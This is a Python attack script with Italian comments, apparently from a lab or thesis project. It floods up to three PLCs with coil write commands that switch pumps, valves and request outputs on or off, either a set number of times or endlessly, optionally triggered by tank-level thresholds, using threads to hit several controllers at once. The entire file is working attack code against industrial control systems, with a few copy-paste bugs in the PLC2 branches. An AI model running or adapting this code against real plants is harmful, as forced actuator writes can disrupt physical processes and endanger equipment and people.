import configparser
import threading

def attack(ctx):
    """
    Questa classe è dedicata a settare i parametri al fine di configurare l'attacco DoS Manuale sulle
    plc inserite (tutti i parametri sono estratti dal file 'config.ini).
    Nel file config.ini nella sezione params troviamo i campi plc1, plc2, plc3 che indicano quali coil
    sono state selezionate dall'utente per essere colpite per l'attacco [0 = non selezionata per l'attacco; 
    1 = selezionata per l'attacco]
    Nel file config.ini nella sezione params troviamo anche i campi number_of_packages e value_of_package.

        number_of_packages --> indica quanti pacchetti voglio inviare per l'attacco (o un numero fissato oppure 
                                digitando la stringa 'loop' vengono inviati un numero infinito di pacchetti)

        value_of_package --> indica il payload dei pacchetti inviati (0 = comando di spegnimento coil; 
                                1 = comando di accensione coil)

    NB: 
        per la continua mancanza di disponibilità dello strumenti di testing (Sistema PLC & HMI sotto VPN) l'attivazione
        del comando basato su trigger (ovvero mandare un certo numero/infinito di pacchetti con valore 0/1
        sulla base del fatto che sia maggiore o minore del valore 'level' di una pompa) non è stato testato nel 
        suo corretto funzionamento a runtime.
        Mi sono operato per testare localmente il codice andando a simulare il parametro formale delle funzioni
        on_status_mode(value: int) [value: int --> sarebbe il livello aggiornato in real time del valore 'level' 
        su %IW0] usando la variabile hardcodata value (1 riga di codice dentro ogni funzione) andando a modificare 
        i valori di input da gui per la verifica di funzionamento.
        Al momento tale variabile è lasciata commentata e con valore pari a 50.
    """
    
    def on_status_mode(value: int):
        #value = 50  #valore di test su singola plc locale che simula il valore level della vasca TEST LEVEL
        counter = 0  
        bool_loop = config.get('params', 'number_of_packages')          
        #BRANCH A NUMERO DI PACCHETTI LIMITATO
        if(bool_loop == "loop" ):
            while True:
                print('value level PLC1 = ', value)
                if (inf1String == "" and sup1String == ""): #Caso con stringhe vuote nei trigger --> NO TRIGGER CASE
                    if  int(config.get('params', 'coil1')) == 1:
                        coil_register_pump.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.0 [PLC1]")
                    if int(config.get('params', 'coil2')) == 1:
                        coil_register_valve.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.1 [PLC1]")
                    if int(config.get('params', 'coil3')) == 1:
                        coil_register_req.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.2 [PLC1]")
                    print("Pacchetto n°: " + str(counter))
                    if comandoSpedito == 1:
                        print("Contenuto del pacchetto: comando = 1 (ON)")
                    elif comandoSpedito == 0:
                        print("Contenuto del pacchetto: comando = 0 (OFF)")
                    else:
                        print("ERROR_loop")
                        exit()
                    counter += 1
                else:                    
                    sup1 = int(config.get('params', 'sup1'))
                    inf1 = int(config.get('params', 'inf1'))
                    if value < inf1 or value > sup1:
                        print ("ATTUAZIONE COMANDO A TRIGGER")
                        if  int(config.get('params', 'coil1')) == 1:
                            coil_register_pump.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.0 [PLC1]")
                        if int(config.get('params', 'coil2')) == 1:
                            coil_register_valve.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.1 [PLC1]")
                        if int(config.get('params', 'coil3')) == 1:
                            coil_register_req.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.2 [PLC1]")
                        print("Pacchetto n°: " + str(counter))
                        if comandoSpedito == 1:
                            print("Contenuto del pacchetto: comando = 1 (ON)")
                        elif comandoSpedito == 0:
                            print("Contenuto del pacchetto: comando = 0 (OFF)")
                        else:
                            print("ERROR_loop")
                            exit()
                        counter += 1
                    else:
                        print("Attesa che i trigger partano...")
        #BRANCH A NUMERO DI PACCHETTI LIMITATO
        else:
            numero_massimo_pacchetti = int(config.get('params', 'number_of_packages'))        
            while counter <= numero_massimo_pacchetti:
                print('value level PLC1 = ', value)
                if (inf1String == "" and sup1String == ""): #Caso con stringhe vuote nei trigger --> NO TRIGGER CASE
                    if  int(config.get('params', 'coil1')) == 1:
                        coil_register_pump.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.0 [PLC1]")
                    if int(config.get('params', 'coil2')) == 1:
                        coil_register_valve.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.1 [PLC1]")
                    if int(config.get('params', 'coil3')) == 1:
                        coil_register_req.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.2 [PLC1]")
                    print("Pacchetto n°: " + str(counter))
                    if comandoSpedito == 1:
                        print("Contenuto del pacchetto: comando ON")
                    elif comandoSpedito == 0:
                        print("Contenuto del pacchetto: comando OFF")
                    else:
                        print("ERROR_loop")
                        exit()
                    counter += 1
                else:                    
                    sup1 = int(config.get('params', 'sup1'))
                    inf1 = int(config.get('params', 'inf1'))
                    if value < inf1 or value > sup1:
                        print ("ATTUAZIONE COMANDO A TRIGGER")
                        if  int(config.get('params', 'coil1')) == 1:
                            coil_register_pump.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.0 [PLC1]")
                        if int(config.get('params', 'coil2')) == 1:
                            coil_register_valve.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.1 [PLC1]")
                        if int(config.get('params', 'coil3')) == 1:
                            coil_register_req.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.2 [PLC1]")
                        print("Pacchetto n°: " + str(counter))
                        if comandoSpedito == 1:
                            print("Contenuto del pacchetto: comando ON")
                        elif comandoSpedito == 0:
                            print("Contenuto del pacchetto: comando OFF")
                        else:
                            print("ERROR_loop")
                            exit()
                        counter += 1
                    else:
                        print("Attesa che i trigger partano...")
            exit()
            
    def on_status_mode2(value: int): 
        #value = 50  #valore di test su singola plc locale che simula il valore level della vasca
        counter = 0  
        bool_loop = config.get('params', 'number_of_packages')                
        #BRANCH A NUMERO DI PACCHETTI LIMITATO
        if(bool_loop == "loop" ):
            while True:
                print('value level PLC2 = ', value)
                if (inf2String == "" and sup2String == ""): #Caso con stringhe vuote nei trigger --> NO TRIGGER CASE
                    if  int(config.get('params', 'coil1')) == 1:
                        coil_register_pump2.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.0 [PLC2]")
                    if int(config.get('params', 'coil2')) == 1:
                        coil_register_valve2.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.1 [PLC2]")
                    if int(config.get('params', 'coil3')) == 1:
                        coil_register_req2.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.2 [PLC2]")
                    print("Pacchetto n°: " + str(counter))
                    if comandoSpedito == 1:
                        print("Contenuto del pacchetto: comando = 1 (ON)")
                    elif comandoSpedito == 0:
                        print("Contenuto del pacchetto: comando = 0 (OFF)")
                    else:
                        print("ERROR_loop")
                        exit()
                    counter += 1
                else:
                    sup2 = int(config.get('params', 'sup2'))
                    inf2 = int(config.get('params', 'inf2'))
                    if value < inf2 or value > sup2:
                        print ("ATTUAZIONE COMANDO A TRIGGER")
                        if  int(config.get('params', 'coil1')) == 1:
                            coil_register_pump2.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.0 [PLC1]")
                        if int(config.get('params', 'coil2')) == 1:
                            coil_register_valve2.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.1 [PLC1]")
                        if int(config.get('params', 'coil3')) == 1:
                            coil_register_req2.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.2 [PLC1]")
                        print("Pacchetto n°: " + str(counter))
                        if comandoSpedito == 1:
                            print("Contenuto del pacchetto: comando = 1 (ON)")
                        elif comandoSpedito == 0:
                            print("Contenuto del pacchetto: comando = 0 (OFF)")
                        else:
                            print("ERROR_loop")
                            exit()
                        counter += 1
                    else:
                        print("Attesa che i trigger partano...")
                    
        #BRANCH A NUMERO DI PACCHETTI LIMITATO
        else:
            numero_massimo_pacchetti = int(config.get('params', 'number_of_packages'))        
            while counter <= numero_massimo_pacchetti:
                print('value level PLC2 = ', value)
                if (inf2String == "" and sup2String == ""): #Caso con stringhe vuote nei trigger --> NO TRIGGER CASE
                    if  int(config.get('params', 'coil1')) == 1:
                        coil_register_pump2.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.0 [PLC2]")
                    if int(config.get('params', 'coil2')) == 1:
                        coil_register_valve2.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.1 [PLC2]")
                    if int(config.get('params', 'coil3')) == 1:
                        coil_register_req2.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.2 [PLC2]")
                    print("Pacchetto n°: " + str(counter))
                    if comandoSpedito == 1:
                        print("Contenuto del pacchetto: comando ON")
                    elif comandoSpedito == 0:
                        print("Contenuto del pacchetto: comando OFF")
                    else:
                        print("ERROR_loop")
                        exit()
                    counter += 1
                else:                    
                    sup2 = int(config.get('params', 'sup1'))
                    inf2 = int(config.get('params', 'inf1'))
                    if value < inf2 or value > sup2:
                        print ("ATTUAZIONE COMANDO A TRIGGER")
                        if  int(config.get('params', 'coil1')) == 1:
                            coil_register_pump2.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.0 [PLC2]")
                        if int(config.get('params', 'coil2')) == 1:
                            coil_register_valve2.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.1 [PLC2]")
                        if int(config.get('params', 'coil3')) == 1:
                            coil_register_req2.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.2 [PLC2]")
                        print("Pacchetto n°: " + str(counter))
                        if comandoSpedito == 1:
                            print("Contenuto del pacchetto: comando ON")
                        elif comandoSpedito == 0:
                            print("Contenuto del pacchetto: comando OFF")
                        else:
                            print("ERROR_loop")
                            exit()
                        counter += 1
                    else:
                        print("Attesa che i trigger partano...")
            exit()

    def on_status_mode3(value: int): 
        #value = 50  #valore di test su singola plc locale che simula il valore level della vasca
        counter = 0  
        bool_loop = config.get('params', 'number_of_packages')                
        #BRANCH A NUMERO DI PACCHETTI ILLIMITATO
        if(bool_loop == "loop" ):
            while True:
                print('value level PLC3 = ', value)
                if (inf3String == "" and sup3String == ""): #Caso con stringhe vuote nei trigger --> NO TRIGGER CASE
                    if  int(config.get('params', 'coil1')) == 1:
                        coil_register_pump3.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.0 [PLC3]")
                    if int(config.get('params', 'coil2')) == 1:
                        coil_register_valve3.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.1 [PLC3]")
                    if int(config.get('params', 'coil3')) == 1:
                        coil_register_req3.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.2 [PLC3]")
                    print("Pacchetto n°: " + str(counter))
                    if comandoSpedito == 1:
                        print("Contenuto del pacchetto: comando = 1 (ON)")
                    elif comandoSpedito == 0:
                        print("Contenuto del pacchetto: comando = 0 (OFF)")
                    else:
                        print("ERROR_loop")
                        exit()
                    counter += 1
                else:
                    sup3 = int(config.get('params', 'sup3'))
                    inf3 = int(config.get('params', 'inf3'))
                    if value < inf3 or value > sup3:
                        print ("ATTUAZIONE COMANDO A TRIGGER")
                        if  int(config.get('params', 'coil1')) == 1:
                            coil_register_pump3.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.0 [PLC3]")
                        if int(config.get('params', 'coil2')) == 1:
                            coil_register_valve3.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.1 [PLC3]")
                        if int(config.get('params', 'coil3')) == 1:
                            coil_register_req3.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.2 [PLC3]")
                        print("Pacchetto n°: " + str(counter))
                        if comandoSpedito == 1:
                            print("Contenuto del pacchetto: comando = 1 (ON)")
                        elif comandoSpedito == 0:
                            print("Contenuto del pacchetto: comando = 0 (OFF)")
                        else:
                            print("ERROR_loop")
                            exit()
                        counter += 1
                    else:
                        print("Attesa che i trigger partano...")
        
        #BRANCH A NUMERO DI PACCHETTI LIMITATO
        else:
            numero_massimo_pacchetti = int(config.get('params', 'number_of_packages'))        
            while counter <= numero_massimo_pacchetti:
                print('value level PLC3 = ', value)
                if (inf3String == "" and sup3String == ""): #Caso con stringhe vuote nei trigger --> NO TRIGGER CASE
                    if  int(config.get('params', 'coil1')) == 1:
                        coil_register_pump3.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.0 [PLC3]")
                    if int(config.get('params', 'coil2')) == 1:
                        coil_register_valve3.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.1 [PLC3]")
                    if int(config.get('params', 'coil3')) == 1:
                        coil_register_req3.write(int(comandoSpedito))
                        print ("Scrivo su %QX0.2 [PLC3]")
                    print("Pacchetto n°: " + str(counter))
                    if comandoSpedito == 1:
                        print("Contenuto del pacchetto: comando ON")
                    elif comandoSpedito == 0:
                        print("Contenuto del pacchetto: comando OFF")
                    else:
                        print("ERROR_loop")
                        exit()
                    counter += 1
                else:                    
                    sup3 = int(config.get('params', 'sup3'))
                    inf3 = int(config.get('params', 'inf3'))
                    if value < inf3 or value > sup3:
                        print ("ATTUAZIONE COMANDO A TRIGGER")
                        if  int(config.get('params', 'coil1')) == 1:
                            coil_register_pump3.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.0 [PLC3]")
                        if int(config.get('params', 'coil2')) == 1:
                            coil_register_valve3.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.1 [PLC3]")
                        if int(config.get('params', 'coil3')) == 1:
                            coil_register_req3.write(int(comandoSpedito))
                            print ("Scrivo su %QX0.2 [PLC3]")
                        print("Pacchetto n°: " + str(counter))
                        if comandoSpedito == 1:
                            print("Contenuto del pacchetto: comando ON")
                        elif comandoSpedito == 0:
                            print("Contenuto del pacchetto: comando OFF")
                        else:
                            print("ERROR_loop")
                            exit()
                        counter += 1
                    else:
                        print("Attesa che i trigger partano...")
            exit()

    def start_polling1():
        input_register1.start_polling(500, on_status_mode)

    def start_polling2():
        input_register2.start_polling(500, on_status_mode2)
        
    def start_polling3():
        input_register3.start_polling(500, on_status_mode3)

    #Leggo i valori dal file 'config.ini'
    config = configparser.ConfigParser()
    config.read('config.ini')
    comandoSpedito = int(config.get('params', 'value_of_package'))
    sup1String = config.get('params', 'sup1')
    inf1String = config.get('params', 'inf1')
    sup2String = config.get('params', 'sup2')
    inf2String = config.get('params', 'inf2')
    sup3String = config.get('params', 'sup3')
    inf3String = config.get('params', 'inf3')

    input_register1     = ctx.register('plc1', 'I', 0)  #Leggo il valore di %IW0 (level)
    coil_register_pump  = ctx.register('plc1', 'C', 0)  #Equivale a  %QX0.0 (pumps)
    coil_register_valve = ctx.register('plc1', 'C', 1)  #Equivale a  %QX0.1 (valve)
    coil_register_req   = ctx.register('plc1', 'C', 2)  #Equivale a  %QX0.2 (request)

    input_register2      = ctx.register('plc2', 'I', 0)  #Leggo il valore di %IW0 (level)
    coil_register_pump2  = ctx.register('plc2', 'C', 0)  #Equivale a  %QX0.0 (pumps)
    coil_register_valve2 = ctx.register('plc2', 'C', 1)  #Equivale a  %QX0.1 (valve)
    coil_register_req2   = ctx.register('plc2', 'C', 2)  #Equivale a  %QX0.2 (request)

    input_register3      = ctx.register('plc3', 'I', 0)  #Leggo il valore di %IW0 (level)
    coil_register_pump3  = ctx.register('plc3', 'C', 0)  #Equivale a  %QX0.0 (pumps)
    coil_register_valve3 = ctx.register('plc3', 'C', 1)  #Equivale a  %QX0.1 (valve)
    coil_register_req3   = ctx.register('plc3', 'C', 2)  #Equivale a  %QX0.2 (request)

    """
        Per garantire il funzionamento su più plc and coils in contemporanea è stato sfruttato il concetto di threads sulla base
        dei valori di plc1, plc2, plc3 ricavate dal file 'config.ini'

        ATTACCO SU UNA SOLA PLC
        caso 1: Corrisponde al caso in cui nella gui venga inserito solo l'indirizzo nel primo campo (obbligatoio).
                Qui il sistema controlla se plc1 non è vuoto e le altre stringhe si e procede con il primo controllo qui sotto.
        
        ATTACCO SU DUE PLC IN CONTEMPORANEA
        caso 2: Corrisponde al caso in cui nella gui vengano inseriti solo i primi due indirizzi adiacenti delle plc da attaccare. 
                Qui il sistema controlla se plc1 e plc2 non sono vuote AND se plc1 è diversa da plc3 e procede con il secondo controllo qui sotto.

        ATTACCO SU TRE PLC IN CONTEMPORANEA
        caso 3: Corrisponde al caso in cui nella gui vengano inseriti tutti e tre gli indirizzi adiacenti delle plc da attaccare. 
                Qui il sistema controlla se plc1 sia diverso da plc2 e se plc2 sia diverso da plc3 (tutti e tre diversi tra loro) 
                e procede con il secondo controllo qui sotto.

        NB: La logica di gestione delgli indirizzi plc1, plc2, plc3 dentro al file 'config.ini' è delegata alla classe gui.py.    
    """
    #ATTACCO UNA SOLA PLC (la prima della lista) == LE TRE ETICHETTE plc1, plc2, plc3 sono uguali nel file config.ini
    if config.get('plc', 'plc1') == config.get('plc', 'plc2') and config.get('plc', 'plc2') == config.get('plc', 'plc3'):
        print("Attacco ad una plc!")
        input_register1.start_polling(500, on_status_mode)
###############################################################################################################

    #ATTACCO IN CONTEMPORANEA SU DUE PLC (uso 2 threads differenti) == Sono uguali la prima e la terza etichetta plc (plc1 == plc3) e le prime due sono diverse (plc1 != plc2) nel file config.ini
    if config.get('plc', 'plc1') != "" and config.get('plc', 'plc3') == config.get('plc', 'plc1') and config.get('plc', 'plc1') != config.get('plc', 'plc2'):
        print("Attacco a due plc in contemporanea!")

        # Crea i thread per eseguire le due funzioni
        thread1 = threading.Thread(target=start_polling1)
        thread2 = threading.Thread(target=start_polling2)

        # Avvia i thread
        thread1.start()
        thread2.start()

        # Attendere che i thread completino l'esecuzione
        thread1.join()
        thread2.join()
        #input_register1.start_polling(500, on_status_mode2())
###############################################################################################################

    #ATTACCO IN CONTEMPORANEA SU TRE PLC (uso 3 threads differenti) == LE TRE ETICHETTE plc1, plc2, plc3 sono tutte diverse nel file config.ini
    if config.get('plc', 'plc1') != config.get('plc', 'plc2') and config.get('plc', 'plc2') != config.get('plc', 'plc3'):
        print("Attacco a tre plc in contemporanea!")

        # Crea i thread per eseguire le due funzioni
        thread1 = threading.Thread(target=start_polling1)
        thread2 = threading.Thread(target=start_polling2)
        thread3 = threading.Thread(target=start_polling3)

        # Avvia i thread
        thread1.start()
        thread2.start()
        thread3.start()

        # Attendere che i thread completino l'esecuzione
        thread1.join()
        thread2.join()
        thread3.join()
###############################################################################################################

